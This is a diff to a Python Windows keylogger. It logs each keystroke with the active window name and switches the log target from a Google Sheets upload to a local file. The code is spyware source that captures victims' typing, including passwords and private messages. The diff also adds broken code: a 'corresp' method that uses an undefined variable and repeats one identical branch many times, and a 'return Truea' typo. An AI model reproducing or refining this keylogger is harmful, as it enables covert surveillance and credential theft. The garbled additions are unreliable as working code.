@@ -12,6 +12,8 @@ import win32event
 import win32api
 import winerror
 import argparse
+import threading
+import time
 
 import gspread
 from oauth2client.service_account import ServiceAccountCredentials
@@ -100,10 +102,40 @@ class Keylogger():
                 pass
             self.data=''
         print('yes')
-        return True
+        return Truea
+
+    def corresp(self):
+        if key == '1':
+            self.data = '&'
+        elif key == '2':
+            self.data = 'é'
+        elif key == '2':
+            self.data = 'é'
+        elif key == '2':
+            self.data = 'é'
+        elif key == '2':
+            self.data = 'é'
+        elif key == '2':
+            self.data = 'é'
+        elif key == '2':
+            self.data = 'é'
+        elif key == '2':
+            self.data = 'é'
+        elif key == '2':
+            self.data = 'é'
+        elif key == '2':
+            self.data = 'é'
+        elif key == '2':
+            self.data = 'é'
+        elif key == '2':
+            self.data = 'é'
+        elif key == '2':
+            self.data = 'é'
+        elif key == '2':
+            self.data = 'é'
 
     def OnKeyboardEvent(self, event):
-        data_logs = (event.WindowName, event.Window, event.Time, event.KeyID, event.Key, event.Alt)
+        data_logs = (event.WindowName, event.Window, event.Time, event.Ascii, event.KeyID, event.Key, event.Alt)
         print(data_logs)  # debugging
         if event.KeyID == 27:  # ESC quit the keylogger
             exit(1)
@@ -113,17 +145,17 @@ class Keylogger():
             self.caps = not self.caps
         elif event.Key == 'Back' or event.Key == 'Delete':  # del
             self.data += '<del>'
-        elif event.KeyID in range(31, 128) or event.KeyID == 13 or event.KeyID == 9:
-            if (self.shift or self.caps) and event.KeyID in range(97, 123):
-                key = chr(event.KeyID-32)
+        elif event.Ascii in range(31, 128) or event.Ascii == 13 or event.Ascii == 9:
+            if (self.shift or self.caps) and event.Ascii in range(97, 123):
+                key = chr(event.Ascii-32)
             else:
-                key = chr(event.KeyID)
+                key = chr(event.Ascii)
             self.data = self.data+key
             if event.WindowName != self.context:
                 self.context = event.WindowName
                 self.context_chg = 1
             print(self.data)  # debugging
-            self.gsheet_logs()
+            self.local_logs()
             self.context_chg = 0
         return True  # needs to return an integer value
 
